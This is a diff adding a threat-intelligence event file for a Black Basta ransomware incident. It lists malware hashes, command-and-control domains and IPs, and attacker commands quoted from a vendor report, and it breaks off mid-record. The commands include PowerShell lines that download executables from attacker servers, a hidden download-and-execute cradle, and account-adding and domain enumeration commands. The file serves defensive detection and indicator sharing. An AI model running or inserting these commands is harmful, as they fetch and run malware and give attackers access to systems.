@@ -1,0 +1,1557 @@
+{
+  "Event": {
+    "info": "HvS Black Basta 2024-04",
+    "analysis": "0",
+    "timestamp": "1712061347",
+    "date": "2024-03-27",
+    "threat_level_id": "1",
+    "publish_timestamp": "1712062483",
+    "extends_uuid": "",
+    "published": true,
+    "uuid": "3135ad39-a339-42e4-8fb3-fe590be5fb79",
+    "Orgc": {
+      "name": "HvS-Consulting",
+      "uuid": "4dbf4c9d-1873-4923-a4a9-2d40d157ac80"
+    },
+    "Tag": [
+      {
+        "colour": "#00e66a",
+        "name": "misp:event-type=\"incident\""
+      },
+      {
+        "colour": "#d2008a",
+        "name": "threatmatch-sectors:sector=\"IT Industry\""
+      },
+      {
+        "colour": "#5900c9",
+        "name": "threatmatch-incident-types:incident_type=\"Ransomware Activity\""
+      },
+      {
+        "colour": "#ffffff",
+        "name": "tlp:white"
+      }
+    ],
+    "Attribute": [
+      {
+        "comment": "Trendmicro: Powershell command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe -c \"$D=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$L='LDAP://'.$D;$D = [ADSI]$L;$Date = $((Get-Date).AddDays(-90).ToFileTime());$str = '(&(objectcategory=computer)(|(lastlogon>='+$Date+')(lastlogontimestamp>='+$Date+')))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PageSize = 10000;$s.PropertiesToLoad.Add('cn') > $Null;Foreach ($CA in $s.FindAll()){;$i++;}; Write-Output Total computers: $i\"",
+        "type": "text",
+        "category": "Other",
+        "uuid": "dd5f0c64-bcbf-4aa3-9fd2-31d812a2a3f8",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Powershell command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe  iwr hxxp://207[.[246.74.189:804/download/Diablo.log -outfile %PUBLIC%\\Diablo.log",
+        "type": "text",
+        "category": "Other",
+        "uuid": "44c64534-61ae-48a9-9d6c-e1c906828346",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Powershell command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe iwr hxxp://51[.[195.192.120:804/download/09D.log -outfile %PUBLIC%\\09D.log",
+        "type": "text",
+        "category": "Other",
+        "uuid": "ce692c3c-a50e-419d-862d-f520473bfc2a",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Powershell command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe iwr hxxp://198[.[244.169.213:8045/download/10443.exe -outfile %PUBLIC%\\10443.exe",
+        "type": "text",
+        "category": "Other",
+        "uuid": "588839c1-0ca4-410f-9579-8c3ccd765869",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Powershell command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://159[.]65[.]130[.]146:4444/a'))\"",
+        "type": "text",
+        "category": "Other",
+        "uuid": "914261e5-01df-437b-a173-cbe0e2c733ba",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike C&C server",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "dns.artstrailreviews.com",
+        "type": "hostname",
+        "category": "Network activity",
+        "uuid": "18d63207-6db4-4ac8-bba8-386406d85710",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "11d2dde6c51e977ed6e3f3d3e256c78062ae41fe780aefecfba1627e66daf771",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "0cdcaf8d-437d-489e-b829-5ee423ad7da4",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "cc13b5721f2ee6081c1244dd367a9de958353c29e32ea8b66e3b20b293fabc55",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "6d774ec1-eb64-4e2f-98d7-2fdca8033a70",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "e3401d7699cc5067620e43bd24e8ccd437832c16f2fa7d5baaad8c170383cc92",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "13fd596f-070a-4870-aa30-41606622fc1d",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "fa131238c3c35efe99cde59dd409c0436fd642b6bf5d56f994f52ab3a62bae4e",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "85c1fd50-f493-466f-8d74-1e51f3e00399",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "764c53ea8ab98e4720ec55876c1b656d38e5e225c3835ffba491f64fa6b24b00",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "396bf182-939f-4db3-a758-47740c682d36",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Bl00dy ransomware",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "3a659609850664cbc0683c8c7b92be816254eb9306e7fb12ad79d5a9af0fb623",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "e90b2b32-fe4e-416f-8b54-f4a7bdcb2f9f",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Bl00dy ransomware",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "7c806b90-228f-4cc6-a26f-25ee46c3c05c",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: XWorm malware",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "444338339260d884070de53554543785acc3c9772e92c5af1dff96e60e67c195",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "638051cb-4402-4317-a486-6aa24b042472",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: XWorm malware",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "47d83461ee57031fd2814382fb526937a4cfa9a3eea7a47e4e7ee185c0602b27",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "03b8601d-9e1b-4caf-b4d3-4e5544c870db",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike C&C server",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "159.65.130.146",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "5ee2011c-8ccb-4c0e-9274-60d2cd34b59d",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Cobalt Strike C&C server",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "wipresolutions.com",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "a53cb2e6-e0c9-4298-8dcc-009553e6566a",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Bl00dy ransomware source",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://23.26.137.225:8084/msappdata.msi",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "c640e62f-4f21-4289-bb7c-1580ef5b0886",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Bl00dy ransomware source",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://23.26.137.225:8091/chromeset.exe",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "5aaddf57-f8db-4fd4-82c7-6d1ec133b87b",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: XWorm C&C",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "input-beats.gl.at.ply.gg",
+        "type": "hostname",
+        "category": "Network activity",
+        "uuid": "e27f9505-0da6-4f02-9946-95523c0d972e",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: XWorm C&C",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "scamkiller.duckdns.org",
+        "type": "hostname",
+        "category": "Network activity",
+        "uuid": "f1c7f9a4-05a4-4c70-8cee-c86eaa6d78d0",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "net.exe group \"Domain Admins\" /domain",
+        "type": "text",
+        "category": "Other",
+        "uuid": "87f50971-264d-496c-aca1-f26005c0edf1",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "net.exe localgroup Administrators Adminis /add",
+        "type": "text",
+        "category": "Other",
+        "uuid": "065d4e3d-8705-4aa9-a08b-2d0985d084b9",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro: Command",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "nltest.exe /domain_trusts /all_trusts",
+        "type": "text",
+        "category": "Other",
+        "uuid": "6485f080-b1e0-4db2-a8b4-8d571cb44d07",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "TrendMicro: Bl00dy ransomware source",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "23.26.137.225",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "000f8e51-9b99-4abf-97ae-ff0a2dc93340",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "https://www.trendmicro.com/de_de/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html",
+        "type": "link",
+        "category": "External analysis",
+        "uuid": "07e3d1a6-44f0-447e-9684-02a0c916daab",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://198[.[244.169.213:8045/download/10443.exe",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "dd288cc2-112d-4f29-b8c4-ac633b487f49",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%PUBLIC%\\10443.exe",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "d439d41f-705b-4ff1-815a-f8cb7a2a75b2",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://51[.[195.192.120:804/download/09D.log",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "a568b2e9-1a39-4ea8-b616-06f7e03f3221",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%PUBLIC%\\09D.log",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "1d2c91cb-9f2e-4b89-89ee-076de0021605",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "http://207[.[246.74.189:804/download/Diablo.log",
+        "type": "url",
+        "category": "Network activity",
+        "uuid": "c8736b95-cb3c-44fa-a703-0db7c57dd217",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "%PUBLIC%\\Diablo.log",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "68bb0f39-edee-4d8f-83da-8bde092fca93",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "207.246.74.189",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "a56ab6aa-cb7f-48f9-a41f-6a41112075ec",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "51.195.192.120",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "be5b7047-9847-4062-b907-ba476e7d46cc",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Trendmicro Report",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "198.244.169.213",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "a4aefebe-404a-4a5f-93de-1d4d6931fb24",
+        "Tag": [
+          {
+            "colour": "#00223b",
+            "name": "osint:source-type=\"blog-post\""
+          }
+        ]
+      },
+      {
+        "comment": "Reconnaissance: sharp shares",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "6ead21965781303e88efc9fcce8578578d6d200dcb37e413bf1e21336d93db33",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "d3a640e2-d452-4507-859b-9f473bc06649",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Reconnaissance: sharp shares",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "sh.exe",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "33a4b9c0-c706-42bf-86f8-1ac1d5c6a965",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "DNS tunneling",
+        "disable_correlation": false,
+        "timestamp": "1712048906",
+        "deleted": false,
+        "to_ids": true,
+        "value": "dns.webnubee.com",
+        "type": "hostname",
+        "category": "Network activity",
+        "uuid": "01126c96-4db4-46a4-8099-437e904dc0c1",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          },
+          {
+            "colour": "#543d00",
+            "name": "cccs:domain-category=\"c2\""
+          }
+        ]
+      },
+      {
+        "comment": "Enumeration",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": false,
+        "value": "powershell.exe -c",
+        "type": "text",
+        "category": "Other",
+        "uuid": "f2dbf540-e0bb-4749-bbd9-d4025ea8cc8e",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Kerberoasting",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "Kerberoast.ps1",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "9dfce69a-0c74-4f36-9af1-bdf0089c9304",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "1.exe (7zg.exe on VT)",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "f21240e0bf9f0a391d514e34d4fa24ecb997d939379d2260ebce7c693e55f061",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "uuid": "6ff81cba-ea5d-4e5a-b49e-9c6f663481a3",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "7zg.exe on VT",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "1.exe",
+        "type": "filename",
+        "category": "Payload delivery",
+        "uuid": "8ba4cd45-de74-4773-af9b-282a7e3bbbfa",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "45.11.183.110",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "b8858e28-62f7-43b0-9644-85a245c018fe",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "198.244.135.245",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "eb08a1fb-4bf9-463a-9a59-1bddbc8d9047",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "91.134.207.30",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "f29dd5b2-6d5b-41f6-b36c-d52d6cc64076",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "37.10.71.143",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "be770cb9-fefc-41a7-9205-716b053c29f4",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "170.130.165.44",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "7b051ca5-ffa0-4e44-9df8-3e4d691c0edd",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "15.204.170.49",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "0c5a144b-68e1-43aa-b315-8dd101704be6",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "79.132.135.149",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "709334b3-5d87-42fd-9c07-21861067b97f",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "170.130.165.132",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "640e36bc-70b6-49c2-aa54-a56b972b62c7",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "79.132.130.60",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "f72abd03-ccfe-441a-96da-1414a4819b00",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "91.134.187.17",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "bc026a66-922c-4d6c-a759-9e9d7f2ccf74",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "webnubee.com",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "a8a526e3-f209-42ca-8e20-0f672ad3f876",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "startupbuss.com",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "a72ebb62-8a46-4095-9c3e-7073136fc222",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "artspathgroup.net",
+        "type": "domain",
+        "category": "Network activity",
+        "uuid": "1eb0916b-1f19-4c45-912e-0a4c74d49512",
+        "Tag": [
+          {
+            "colour": "#005fa4",
+            "name": "osint:source-type=\"manual-analysis\""
+          },
+          {
+            "colour": "#007ad2",
+            "name": "osint:certainty=\"100\""
+          },
+          {
+            "colour": "#00565c",
+            "name": "false-positive:risk=\"low\""
+          }
+        ]
+      },
+      {
+        "comment": "Destination was pinged by threat actor. Probably C2",
+        "disable_correlation": false,
+        "timestamp": "1712048588",
+        "deleted": false,
+        "to_ids": true,
+        "value": "144.202.38.240",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "uuid": "61205476-93fb-4ea1-9033-85f6e6c3ecc6",
+        "Tag": [
+          {
+            "colour": "#005fa4",
